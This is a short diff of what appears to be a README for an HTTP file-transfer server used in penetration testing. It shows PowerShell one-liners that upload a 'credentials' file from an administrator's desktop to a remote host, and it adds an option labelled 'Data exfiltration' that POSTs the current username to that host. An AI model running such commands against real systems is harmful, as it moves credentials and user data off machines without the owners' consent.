@@ -22,6 +22,6 @@ Download file
 Upload file  
 `Invoke-Restmethod -uri http://[host.ip]:8080/credentials.zip -Method Put -Infile C:\\users\\administrator\\desktop\\credentials`  
 
-Pending issue:
-- Change to PUT method instead of using POST to upload file using UI
-- Modify the POST handler to accept normal POST data which can be used for data exfiltration. Currently not supported.
+Option3:   
+Data exfiltration  
+`$postParams = @{Current_User=whoami}; Invoke-WebRequest -Uri http://[host.ip]:8080 -Method POST -Body $postParams;`
